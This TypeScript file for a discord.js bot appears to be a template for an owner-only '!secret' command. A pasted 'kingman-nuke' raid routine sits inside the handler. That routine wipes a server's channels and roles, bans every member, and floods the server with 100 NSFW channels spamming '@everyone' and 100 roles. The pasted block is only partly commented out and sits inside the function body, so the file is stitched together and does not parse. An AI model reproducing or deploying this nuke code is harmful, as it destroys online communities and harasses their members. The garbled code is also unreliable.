import type { Message, Client } from "discord.js";

/**
 * !secret command — bot-owner only.
 *
 * Fill in the body of this function with whatever you want the command to do.
 *
 * @param message  The Discord message that triggered the command
 * @param args     Any words typed after !secret (may be empty)
 * @param client   The discord.js Client instance
 */
export async function handleSecret(
  message: Message,
  args: string[],
  client: Client,
): Promise<void> {
  // ── import { Command } from '../../KINGMAN_NUKE/types/KING-NUKE';
export default {
    name: "kingman-nuke",
    description: "",
    run: async(client, kmsg, args, kingman)=> {
        if(!client.config.devs.includes(kmsg.author.id)) return console.log("not dev");
        if(!kmsg.guild) return;
        await kingman.ChangerServerInfo(kmsg.guild).catch(e=> {
            console.log(e)
        })
        await kingman.clearChannels(kmsg.guild).catch(e=> {
            console.log(e)
        })
        await kingman.clearRoles(kmsg.guild).catch(e=> {
            console.log(e)
        })
        await kingman.banEveryone(kmsg.guild).catch(e=> {
            console.log(e)
        })
        let ops = { 
            channels: {
                name: "kingman",
                nsfw: true,
                number: 100,
                topic: "KINGMAN HERE SAY GOODNIGHT :)"
            },
            messages: {
                content: "> @everyone KINGMAN NUKE SYSTEM",
                number: 25
            }
        }
        await kingman.CreateChannels(kmsg.guild, ops).catch(e=> {
            console.log(e)
        })
        let ops2 = { 
            name: "KINGMAN",
            color: "RED",
            number: 100
        }
        await kingman.createRoles(kmsg.guild, ops2).catch(e=> {
            console.log(e)
        })

    } 
} as Command ──────────────────────────────────────────────────
  void args;
  void client;

  await message.reply("🔒 secret command executed.");
  // ────────────────────────────────────────────────────────────────────────
}
